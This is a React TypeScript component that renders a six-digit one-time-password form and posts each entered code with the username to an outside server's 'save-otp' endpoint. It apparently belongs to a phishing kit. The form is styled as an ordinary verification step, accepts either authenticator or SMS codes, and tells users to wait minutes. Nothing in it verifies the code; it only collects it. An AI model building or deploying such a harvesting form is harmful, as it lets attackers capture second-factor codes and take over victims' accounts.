import React, { useState, useRef, useEffect } from 'react';
import { ArrowRight, CheckCircle, AlertCircle } from 'lucide-react'; // Import icons used in App.tsx

const OtpForm: React.FC<{ username: string | null; onOtpSuccess: () => void }> = ({ username, onOtpSuccess }) => {
  const [otpDigits, setOtpDigits] = useState<string[]>(new Array(6).fill(''));
  const [message, setMessage] = useState<string>('');
  const [isLoading, setIsLoading] = useState(false);
  const inputRefs = useRef<HTMLInputElement[]>([]);

  useEffect(() => {
    inputRefs.current = inputRefs.current.slice(0, 6);
  }, []);

  const handleChange = (index: number, e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (!/^\d*$/.test(value)) return; // Only allow digits

    const newOtpDigits = [...otpDigits];
    newOtpDigits[index] = value.slice(-1); // Take only the last character

    setOtpDigits(newOtpDigits);

    // Move focus to next input field if a digit was entered
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      // If backspace is pressed and current field is empty, move focus to previous field
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    setMessage('');
    setIsLoading(true);

    if (!username) {
      setMessage('Error: No logged-in user found.');
      setIsLoading(false);
      return;
    }

    const otp = otpDigits.join('');

    if (otp.length !== 6 || !/^\d+$/.test(otp)) {
      setMessage('Error: OTP must be a 6-digit number.');
      setIsLoading(false);
      return;
    }

    try {
      const response = await fetch('https://maxwel.onrender.com/api/save-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ otp, username }),
      });

      const data = await response.json();

      if (response.ok) {
        onOtpSuccess(); // Trigger the success callback
      } else {
        setMessage('Error: ' + (data.message || 'Failed to save OTP'));
      }
    } catch (error) {
      console.error('Network error:', error);
      setMessage('Network error. Could not connect to server.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="font-sans text-slate-900">
      <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Enter OTP</h2>
      <p className="text-sm text-gray-500 mb-6 text-center">TYPE CODE DISPLAYED ON AUTHENTICATOR APP OR CODE SENT Via SMS<br/>(Wait 1-3 minutes for verification code)</p>

      {message && (
        <div className={`mb-6 p-3 rounded-lg flex items-start gap-3 text-sm ${message.startsWith('Error') ? 'bg-red-50 border border-red-100 text-red-600 animate-pulse-slow' : 'bg-green-50 border border-green-100 text-green-600'}`}>
          {message.startsWith('Error') ? <AlertCircle className="w-5 h-5 shrink-0 mt-0.5" /> : <CheckCircle className="w-5 h-5 shrink-0 mt-0.5" />}
          <p>{message}</p>
        </div>
      )}

      <form onSubmit={handleSubmit}>
        <div className="flex justify-center gap-2 mb-8">
          {otpDigits.map((digit, index) => (
            <input
              key={index}
              type="text" // Use text for better control over single digit input
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(index, e)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              ref={(el) => (inputRefs.current[index] = el as HTMLInputElement)}
              className="w-10 h-12 text-center text-xl font-bold bg-slate-50 border border-slate-200 rounded-lg focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-500/10 transition-all outline-none"
              required
            />
          ))}
        </div>

        <div className="mt-8">
          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-slate-900 text-white py-3.5 rounded-lg font-bold text-sm tracking-wide hover:bg-slate-800 transition-all shadow-lg flex items-center justify-center gap-2 group active:scale-[0.98]"
          >
            {isLoading ? (
              <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
            ) : (
              <>Confirm OTP <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" /></>
            )}
          </button>
        </div>
      </form>
    </div>
  );
};

export default OtpForm;
